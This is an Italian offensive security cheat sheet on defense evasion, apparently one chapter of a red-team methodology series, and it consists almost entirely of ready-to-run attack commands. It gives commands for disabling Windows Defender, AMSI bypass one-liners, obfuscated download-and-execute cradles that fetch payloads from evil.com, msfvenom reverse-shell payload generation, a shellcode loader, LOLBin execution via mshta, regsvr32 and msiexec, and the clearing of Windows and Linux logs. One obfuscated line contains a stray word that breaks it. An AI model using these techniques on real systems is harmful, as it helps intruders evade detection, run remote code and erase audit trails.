# 🛡️ Fase 6: Defense Evasion

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Obiettivo:** Bypassare i controlli di sicurezza (AV, EDR, AMSI, firewall) per evitare il rilevamento.

---

## 🛡️ Evasion di Windows Defender

### Disabilitare Windows Defender (Richiede Admin)
```powershell
# Disabilita monitoraggio in tempo reale
Set-MpPreference -DisableRealtimeMonitoring $true

# Disabilita tutte le funzionalità Defender
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Aggiungi percorsi esclusi
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Via Registro
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Verifica Stato Defender
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 AMSI Bypass

### PowerShell AMSI Bypass
```powershell
# Bypass 1 - amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass 2 - One-liner di Matt Graeber
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Bypass 3 - Memory patching
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### AMSI Bypass Offuscato
```powershell
# Offuscamento stringhe
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Offuscamento Payload

### Offuscamento PowerShell
```powershell
# Codifica Base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Concatenazione stringhe
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Offuscamento dei Binari
```bash
# msfvenom encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# XOR custom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Shellcode Loader
```c
// Loader shellcode semplice in C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Living Off The Land (LOLBins)

### Download & Esecuzione
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Esecuzione Payload
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### AppLocker/WDAC Bypass
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 ETW/Logging Bypass

### Disabilita Event Tracing
```powershell
# Patch ETW
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Cancella Log Eventi
```powershell
# Cancella tutti i log
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# O disabilita logging
auditpol /clear /y
```

### Disabilita Logging PowerShell
```powershell
# Disabilita Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Disabilita Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Evasion su Linux

### Timestomping
```bash
# Cambia timestamp file
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Cancella Log
```bash
# Cancella cronologia bash
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Cancella log di sistema
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Nascondere i Processi
```bash
# Nascondi nome processo
exec -a "[kworker/0:0]" ./malicious

# LD_PRELOAD hiding
# Compila una libreria che intercetta readdir() per nascondere i processi
```

---

## 🛠️ Strumenti

| Strumento | Scopo |
|-----------|-------|
| **Invoke-Obfuscation** | Offuscamento PowerShell |
| **Veil** | Generazione payload |
| **ScareCrow** | Generatore payload bypass EDR |
| **Donut** | Generatore shellcode |
| **Nimcrypt2** | Packer PE |
| **PEzor** | Loader shellcode PE |

---

## 📊 Riferimento Rapido

### Metodi di Rilevamento & Bypass

| Rilevamento | Tecnica di Bypass |
|-------------|-------------------|
| Signature-based | Offuscamento, encoding |
| AMSI | Memory patching, script bypass |
| ETW | Patch ETW |
| Logging | Disabilita logging, cancella log |
| AppLocker | LOLBins, bypass path |
| Behavior | Living off the land |

### LOLBins Quick List

| Binario | Uso |
|---------|-----|
| certutil | Download file |
| bitsadmin | Download file |
| mshta | Esegui HTA |
| rundll32 | Esegui DLL/JS |
| regsvr32 | Esegui SCT |
| msbuild | Esegui XML |
| installutil | Esegui EXE |

---

## 🔗 Cheatsheet Correlate

- [PowerShell](../PowerShell/translations/README.it.md)
- [Mimikatz](../Mimikatz/translations/README.it.md)

---

**Fase Precedente:** [← 05 - Persistence](./05-Persistence.it.md)

**Fase Successiva:** [07 - Actions on Objectives →](./07-Actions-Objectives.it.md)
